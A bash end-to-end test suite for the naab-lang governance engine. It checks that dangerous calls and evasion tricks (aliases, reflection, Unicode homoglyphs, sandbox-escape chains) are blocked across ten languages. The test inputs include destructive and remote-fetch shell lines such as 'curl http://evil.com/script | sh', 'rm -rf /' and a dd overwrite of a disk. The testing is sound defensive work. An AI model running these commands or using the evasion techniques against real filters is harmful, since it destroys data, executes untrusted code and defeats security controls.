#!/usr/bin/env bash
# test_evasion_e2e.sh — End-to-end evasion hardening tests
#
# Verifies that evasion vectors are blocked when running through naab-lang
# (the full engine), not just through naab-gov check. This confirms the
# normalization + alias expansion + pattern detection pipeline works
# end-to-end in polyglot block execution.
#
# Run: bash tests/security/test_evasion_e2e.sh

PASS=0
FAIL=0
LANG_DIR="$(cd "$(dirname "$0")/../.." && pwd)"
NAAB="$LANG_DIR/build/naab-lang"
TMPDIR="${TMPDIR:-/data/data/com.termux/files/usr/tmp}"
TESTDIR="$TMPDIR/evasion_e2e_$$"

if [ ! -x "$NAAB" ]; then
    echo "SKIP: naab-lang not built"
    exit 0
fi

mkdir -p "$TESTDIR"

# Governance config — enforce mode with all relevant restrictions
cat > "$TESTDIR/govern.json" <<'EOF'
{
    "version": "3.0",
    "mode": "enforce",
    "restrictions": {
        "dangerous_calls": {"level": "hard"},
        "code_injection": {"level": "hard"},
        "obfuscation": {"level": "hard", "enabled": true}
    },
    "security": {
        "sandbox_level": "unrestricted"
    }
}
EOF

cleanup() {
    rm -rf "$TESTDIR"
}
trap cleanup EXIT

# check_blocked: write a .naab file with a polyglot block, expect governance block
check_blocked() {
    local desc="$1" lang="$2" code="$3"
    local testfile="$TESTDIR/test_$PASS$FAIL.naab"

    cat > "$testfile" <<NAAB
main {
    try {
        let r = <<$lang
$code
>>
        print("NOT_BLOCKED")
    } catch (e) {
        let msg = string(e)
        if msg.contains("Governance") || msg.contains("Dangerous") || msg.contains("overnance") {
            print("BLOCKED")
        } else {
            print("OTHER_ERROR:" + msg)
        }
    }
}
NAAB

    local output
    output=$("$NAAB" "$testfile" 2>/dev/null)

    if echo "$output" | grep -q "BLOCKED"; then
        echo "  PASS: $desc"
        PASS=$((PASS + 1))
    elif echo "$output" | grep -q "NOT_BLOCKED"; then
        echo "  FAIL: $desc (evasion succeeded — NOT blocked)"
        FAIL=$((FAIL + 1))
    else
        echo "  FAIL: $desc (unexpected output: $(echo "$output" | head -1))"
        FAIL=$((FAIL + 1))
    fi
}

# check_not_blocked: safe code should execute without governance errors
check_not_blocked() {
    local desc="$1" lang="$2" code="$3"
    local testfile="$TESTDIR/test_safe_$PASS$FAIL.naab"

    cat > "$testfile" <<NAAB
main {
    try {
        let r = <<$lang
$code
>>
        print("OK")
    } catch (e) {
        let msg = string(e)
        if msg.contains("Governance") || msg.contains("Dangerous") {
            print("FALSE_POSITIVE")
        } else {
            print("OK_OTHER_ERROR")
        }
    }
}
NAAB

    local output
    output=$("$NAAB" "$testfile" 2>/dev/null)

    if echo "$output" | grep -q "FALSE_POSITIVE"; then
        echo "  FAIL: $desc (false positive — safe code blocked)"
        FAIL=$((FAIL + 1))
    else
        echo "  PASS: $desc"
        PASS=$((PASS + 1))
    fi
}

echo "=== End-to-End Evasion Hardening Tests ==="
echo ""

# ─── Direct dangerous calls ──────────────────────────────────────────

echo "--- Direct dangerous calls (baseline) ---"

check_blocked "os.system() in Python" \
    python 'import os
os.system("echo hello")'

check_blocked "eval() in Python" \
    python 'eval("1+1")'

check_blocked "exec() in Python" \
    python 'exec("x = 1")'

check_blocked "eval() in JavaScript" \
    javascript 'eval("alert(1)")'

check_not_blocked "safe Python (print)" \
    python 'print("hello world")'

check_not_blocked "safe JavaScript (console.log)" \
    javascript 'console.log("hello")'

echo ""

# ─── Variable alias evasion ──────────────────────────────────────────

echo "--- Variable alias evasion ---"

check_blocked "Python: s = os.system; s(cmd)" \
    python 'import os
s = os.system
s("echo hello")'

check_blocked "Python: fn = eval; fn(code)" \
    python 'fn = eval
fn("1+1")'

check_blocked "Python: run = subprocess.Popen; run(cmd)" \
    python 'import subprocess
run = subprocess.Popen
run(["echo", "hello"])'

echo ""

# ─── From-import evasion ─────────────────────────────────────────────

echo "--- From-import evasion ---"

check_blocked "Python: from os import system; system(cmd)" \
    python 'from os import system
system("echo hello")'

check_blocked "Python: from os import system as s; s(cmd)" \
    python 'from os import system as s
s("echo hello")'

check_blocked "Python: from subprocess import Popen; Popen(cmd)" \
    python 'from subprocess import Popen
Popen(["echo", "hello"])'

echo ""

# ─── Module alias evasion ────────────────────────────────────────────

echo "--- Module alias evasion ---"

check_blocked "Python: import os as o; o.system(cmd)" \
    python 'import os as o
o.system("echo hello")'

check_blocked "Python: import subprocess as sp; sp.Popen(cmd)" \
    python 'import subprocess as sp
sp.Popen(["echo", "hello"])'

check_blocked "Python: module alias + func alias combined" \
    python 'import subprocess as sp
fn = sp.Popen
fn(["echo", "hello"])'

echo ""

# ─── Star import evasion ─────────────────────────────────────────────

echo "--- Star import evasion ---"

check_blocked "Python: from os import *; system(cmd)" \
    python 'from os import *
system("echo hello")'

echo ""

# ─── Transitive alias chains ─────────────────────────────────────────

echo "--- Transitive alias chains ---"

check_blocked "Python: a = os.system; b = a; b(cmd)" \
    python 'import os
a = os.system
b = a
b("echo hello")'

check_blocked "Python: 3-level chain" \
    python 'import os
a = os.system
b = a
c = b
c("echo hello")'

echo ""

# ─── Dict/list indirection ───────────────────────────────────────────

echo "--- Dict/list indirection ---"

check_blocked "Python: d[key] = os.system; d[key](cmd)" \
    python 'import os
d = {}
d["fn"] = os.system
d["fn"]("echo hello")'

check_blocked "Python: fns = [os.system]; fns[0](cmd)" \
    python 'import os
fns = [os.system]
fns[0]("echo hello")'

echo ""

# ─── Reflection access ───────────────────────────────────────────────

echo "--- Reflection access ---"

check_blocked "Python: globals()[\"eval\"](code)" \
    python 'globals()["eval"]("1+1")'

check_blocked "Python: __builtins__[\"eval\"](code)" \
    python '__builtins__["eval"]("1+1")'

check_blocked "Python: os.__dict__[\"system\"](cmd)" \
    python 'import os
fn = os.__dict__["system"]
fn("echo hello")'

echo ""

# ─── Class hierarchy sandbox escape ──────────────────────────────────

echo "--- Class hierarchy sandbox escape ---"

check_blocked "Python: __class__.__bases__ traversal" \
    python '().__class__.__bases__[0].__subclasses__()'

check_blocked "Python: type().__subclasses__()" \
    python "type('').__subclasses__()"

check_blocked "Python: __reduce__ access" \
    python 'import os
os.__class__.__reduce__ = lambda s: (os.system, ("echo",))'

echo ""

# ─── Missing os functions ────────────────────────────────────────────

echo "--- Missing os functions ---"

check_blocked "Python: os.popen(cmd)" \
    python 'import os
os.popen("echo hello")'

check_blocked "Python: os.execvp(cmd)" \
    python 'import os
os.execvp("/bin/echo", ["echo", "hello"])'

echo ""

# ─── Unicode/homoglyph evasion ───────────────────────────────────────

echo "--- Unicode/homoglyph evasion ---"

check_blocked "Python: Cyrillic o in os.system()" \
    python "$(printf 'import os\n\xd0\xbes.system(\"echo hello\")')"

check_blocked "Python: Cyrillic s in os.system()" \
    python "$(printf 'import os\nos.\xd1\x95ystem(\"echo hello\")')"

check_blocked "Python: fullwidth eval()" \
    python "$(printf '\xef\xbd\x85\xef\xbd\x96\xef\xbd\x81\xef\xbd\x8c(\"1+1\")')"

check_blocked "Python: zero-width char in eval()" \
    python "$(printf 'ev\xe2\x80\x8bal(\"1+1\")')"

check_not_blocked "Python: normal code (no homoglyphs)" \
    python 'x = 42
print(x)'

echo ""

# ─── Whitespace/newline evasion ──────────────────────────────────────

echo "--- Whitespace/newline evasion ---"

check_blocked "Python: newline in os.system()" \
    python "$(printf 'import os\nos.\nsystem(\"echo hello\")')"

check_blocked "Python: spaces around dot" \
    python 'import os
os . system("echo hello")'

check_blocked "Python: line continuation" \
    python "$(printf 'import os\nos.\\\nsystem(\"echo hello\")')"

echo ""

# ─── JavaScript: Full coverage ───────────────────────────────────────

echo "--- JavaScript: Direct dangerous calls ---"

check_blocked "JS: eval(code)" \
    javascript 'eval("alert(1)")'

check_blocked "JS: Function constructor" \
    javascript 'Function("return 1")()'

check_blocked "JS: require child_process" \
    javascript 'require("child_process")'

echo ""

echo "--- JavaScript: Alias evasion ---"

check_blocked "JS: const fn = eval; fn(code)" \
    javascript 'const fn = eval; fn("alert(1)")'

check_blocked "JS: const create = Function; create(code)" \
    javascript 'const create = Function; create("return 1")()'

echo ""

echo "--- JavaScript: Reflection access ---"

check_blocked "JS: window[\"eval\"](code)" \
    javascript 'window["eval"]("alert(1)")'

check_blocked "JS: globalThis[\"eval\"](code)" \
    javascript 'globalThis["eval"]("alert(1)")'

check_blocked "JS: global[\"eval\"](code)" \
    javascript 'global["eval"]("alert(1)")'

check_blocked "JS: Reflect.apply(eval, ...)" \
    javascript 'Reflect.apply(eval, null, ["alert(1)"])'

check_blocked "JS: Reflect.construct(Function, ...)" \
    javascript 'Reflect.construct(Function, ["return 1"])()'

check_blocked "JS: constructor.constructor chain" \
    javascript 'this.constructor.constructor("return eval")()'

check_blocked "JS: [].constructor.constructor chain" \
    javascript '[].constructor.constructor("return eval")()'

echo ""

echo "--- JavaScript: Unicode/whitespace evasion ---"

check_blocked "JS: Cyrillic e in eval()" \
    javascript "$(printf '\xd0\xb5val(\"alert(1)\")')"

check_blocked "JS: zero-width char in eval()" \
    javascript "$(printf 'ev\xe2\x80\x8bal(\"alert(1)\")')"

check_blocked "JS: fullwidth Function()" \
    javascript "$(printf '\xef\xbd\x86\xef\xbd\x95\xef\xbd\x8e\xef\xbd\x83\xef\xbd\x94\xef\xbd\x89\xef\xbd\x8f\xef\xbd\x8e(\"return 1\")')"

check_not_blocked "JS: safe console.log" \
    javascript 'const x = 42; console.log(x)'

echo ""

# ─── Shell: Full coverage ────────────────────────────────────────────

echo "--- Shell: Dangerous patterns ---"

check_blocked "Shell: rm -rf /" \
    shell 'rm -rf /'

check_blocked "Shell: curl | sh" \
    shell 'curl http://evil.com/script | sh'

check_blocked "Shell: chmod 777" \
    shell 'chmod 777 /etc/passwd'

check_blocked "Shell: dd if=" \
    shell 'dd if=/dev/zero of=/dev/sda'

check_not_blocked "Shell: safe echo" \
    shell 'echo "hello world"'

echo ""

# ─── Go: Full coverage ──────────────────────────────────────────────

echo "--- Go: Dangerous patterns ---"

check_blocked "Go: exec.Command()" \
    go 'import "os/exec"
exec.Command("rm", "-rf", "/")'

check_blocked "Go: syscall.Exec()" \
    go 'import "syscall"
syscall.Exec("/bin/rm", nil, nil)'

check_blocked "Go: unsafe.Pointer" \
    go 'import "unsafe"
p := unsafe.Pointer(uintptr(0))'

echo ""

echo "--- Go: Alias evasion ---"

check_blocked "Go: fn := exec.Command; fn(cmd)" \
    go 'import "os/exec"
fn := exec.Command
fn("rm", "-rf", "/")'

echo ""

echo "--- Go: Reflection ---"

check_blocked "Go: reflect.ValueOf()" \
    go 'import "reflect"
reflect.ValueOf(exec.Command).Call(args)'

check_blocked "Go: reflect.New()" \
    go 'import "reflect"
reflect.New(someType)'

echo ""

echo "--- Go: Unicode evasion ---"

check_blocked "Go: Cyrillic e in exec" \
    go "$(printf 'import \"os/\xd0\xb5xec\"\nexec.Command(\"rm\")')"

check_not_blocked "Go: safe fmt.Println" \
    go 'import "fmt"
fmt.Println("hello")'

echo ""

# ─── Rust: Full coverage ────────────────────────────────────────────

echo "--- Rust: Dangerous patterns ---"

check_blocked "Rust: Command::new()" \
    rust 'use std::process::Command;
Command::new("rm").arg("-rf").arg("/").spawn()'

check_blocked "Rust: unsafe block" \
    rust 'unsafe { std::ptr::null::<i32>().read() }'

check_blocked "Rust: libc:: FFI" \
    rust 'libc::system(cmd)'

check_not_blocked "Rust: safe println" \
    rust 'println!("hello world");'

echo ""

# ─── Ruby: Full coverage ────────────────────────────────────────────

echo "--- Ruby: Direct dangerous calls ---"

check_blocked "Ruby: system()" \
    ruby 'system("echo hello")'

check_blocked "Ruby: eval()" \
    ruby 'eval("puts 1")'

echo ""

echo "--- Ruby: Alias evasion ---"

check_blocked "Ruby: run = system; run(cmd)" \
    ruby 'run = system
run("echo hello")'

echo ""

echo "--- Ruby: Reflection ---"

check_blocked "Ruby: send(:system, cmd)" \
    ruby 'obj.send(:system, "echo hello")'

check_blocked "Ruby: public_send(:exec, cmd)" \
    ruby 'obj.public_send(:exec, "echo hello")'

check_blocked "Ruby: method(:system).call" \
    ruby 'fn = method(:system)
fn.call("echo hello")'

check_blocked "Ruby: instance_eval" \
    ruby 'obj.instance_eval("system(\"echo\")")'

check_blocked "Ruby: class_eval" \
    ruby 'String.class_eval("system(\"echo\")")'

check_blocked "Ruby: module_eval" \
    ruby 'Kernel.module_eval("system(\"echo\")")'

check_blocked "Ruby: const_get" \
    ruby 'Object.const_get(:FileUtils)'

echo ""

echo "--- Ruby: Shell execution syntax ---"

check_blocked "Ruby: backtick execution" \
    ruby '`echo hello`'

check_blocked "Ruby: %x() execution" \
    ruby '%x(echo hello)'

echo ""

echo "--- Ruby: Unicode evasion ---"

check_blocked "Ruby: Cyrillic e in eval()" \
    ruby "$(printf '\xd0\xb5val(\"puts 1\")')"

check_not_blocked "Ruby: safe array operations" \
    ruby 'x = [1, 2, 3]
puts x.length'

echo ""

# ─── PHP: Full coverage ─────────────────────────────────────────────

echo "--- PHP: Direct dangerous calls ---"

check_blocked "PHP: system()" \
    php 'system("echo hello")'

check_blocked "PHP: exec()" \
    php 'exec("echo hello")'

check_blocked "PHP: shell_exec()" \
    php 'shell_exec("echo hello")'

check_blocked "PHP: passthru()" \
    php 'passthru("echo hello")'

check_blocked "PHP: eval()" \
    php 'eval("echo 1;")'

echo ""

echo "--- PHP: Alias evasion ---"

check_blocked "PHP: fn = system; fn(cmd)" \
    php 'fn = system
fn("echo hello")'

echo ""

echo "--- PHP: Reflection ---"

check_blocked "PHP: call_user_func()" \
    php 'call_user_func("system", "echo hello")'

check_blocked "PHP: call_user_func_array()" \
    php 'call_user_func_array("exec", ["echo hello"])'

check_blocked "PHP: create_function()" \
    php 'create_function("", "system(\"echo\");")'

check_blocked "PHP: assert()" \
    php 'assert("system(\"echo\")")'

check_blocked "PHP: ReflectionFunction" \
    php '$f = new ReflectionFunction("system");'

check_blocked "PHP: ReflectionMethod" \
    php '$m = new ReflectionMethod($obj, "exec");'

check_blocked "PHP: variable variables" \
    php '${$var}("echo hello")'

echo ""

echo "--- PHP: String obfuscation ---"

check_blocked "PHP: preg_replace /e modifier" \
    php 'preg_replace("/.*/e", "system(\"echo\")", "x")'

check_blocked "PHP: string concat function name" \
    php '$fn = "sys"."tem"; $fn("echo hello")'

echo ""

echo "--- PHP: Unicode evasion ---"

check_blocked "PHP: Cyrillic e in eval()" \
    php "$(printf '\xd0\xb5val(\"echo 1;\")')"

check_not_blocked "PHP: safe echo" \
    php 'echo "hello";'

echo ""

# ─── C++: Full coverage ─────────────────────────────────────────────

echo "--- C++: Dangerous patterns ---"

check_blocked "C++: system()" \
    cpp 'system("echo hello");'

check_blocked "C++: popen()" \
    cpp 'popen("echo hello", "r");'

check_blocked "C++: dlopen()" \
    cpp 'dlopen("libevil.so", RTLD_LAZY);'

check_blocked "C++: inline assembly" \
    cpp '__asm__("nop");'

check_not_blocked "C++: safe cout" \
    cpp 'std::cout << "hello" << std::endl;'

echo ""

# ─── C#: Full coverage ──────────────────────────────────────────────

echo "--- C#: Direct dangerous calls ---"

check_blocked "C#: Process.Start()" \
    csharp 'Process.Start("cmd.exe")'

check_blocked "C#: unsafe block" \
    csharp 'unsafe { int* p = null; }'

echo ""

echo "--- C#: Reflection ---"

check_blocked "C#: Type.GetType()" \
    csharp 'Type.GetType("System.Diagnostics.Process")'

check_blocked "C#: GetMethod()" \
    csharp 'type.GetMethod("Start")'

check_blocked "C#: MethodInfo.Invoke()" \
    csharp 'method.Invoke(null, args)'

check_blocked "C#: Activator.CreateInstance()" \
    csharp 'Activator.CreateInstance(processType)'

check_blocked "C#: Assembly.Load()" \
    csharp 'Assembly.Load("System.Diagnostics")'

check_blocked "C#: Assembly.LoadFrom()" \
    csharp 'Assembly.LoadFrom("/path/to/evil.dll")'

check_blocked "C#: Reflection.Emit" \
    csharp 'Reflection.Emit.DynamicMethod dm = new()'

check_blocked "C#: DllImport" \
    csharp 'DllImport("kernel32.dll")'

check_not_blocked "C#: safe Console.WriteLine" \
    csharp 'Console.WriteLine("hello");'

echo ""

# ─── Nim: Coverage ──────────────────────────────────────────────────

echo "--- Nim: Dangerous patterns ---"

check_blocked "Nim: execProcess()" \
    nim 'execProcess("echo hello")'

check_blocked "Nim: startProcess()" \
    nim 'startProcess("echo hello")'

check_blocked "Nim: importc pragma" \
    nim '{.importc: "system".}'

check_blocked "Nim: emit pragma" \
    nim '{.emit: "system(\"echo\");".}'

check_not_blocked "Nim: safe echo" \
    nim 'echo "hello"'

echo ""

# ─── False positive checks (all languages) ──────────────────────────

echo "--- False positive checks ---"

check_not_blocked "Python: safe json.loads" \
    python 'import json
data = json.loads("{}")'

check_not_blocked "Python: safe os.path.join" \
    python 'from os import path
result = path.join("/tmp", "file.txt")'

check_not_blocked "Python: safe variable named system" \
    python 'system = "linux"
print(system)'

check_not_blocked "JavaScript: safe Math.random" \
    javascript 'const x = Math.random(); console.log(x)'

check_not_blocked "Go: safe fmt usage" \
    go 'import "fmt"
fmt.Sprintf("hello %s", "world")'

check_not_blocked "Shell: safe ls command" \
    shell 'ls -la /tmp'

echo ""
echo "=== Results: $PASS passed, $FAIL failed ==="
[ $FAIL -eq 0 ] || exit 1
